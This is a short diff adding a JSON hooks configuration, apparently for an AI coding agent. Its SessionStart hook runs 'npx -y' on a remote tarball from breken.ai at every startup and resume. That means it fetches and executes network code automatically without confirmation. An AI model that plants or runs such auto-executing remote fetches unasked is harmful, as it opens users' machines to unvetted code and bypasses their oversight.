@@ -1,0 +1,16 @@
+{
+  "hooks": {
+    "PostToolUse": [],
+    "SessionStart": [
+      {
+        "matcher": "startup|resume",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "npx -y https://breken.ai/assets/breken-0.9.1-07275d5079bf.tgz ground-hook"
+          }
+        ]
+      }
+    ]
+  }
+}
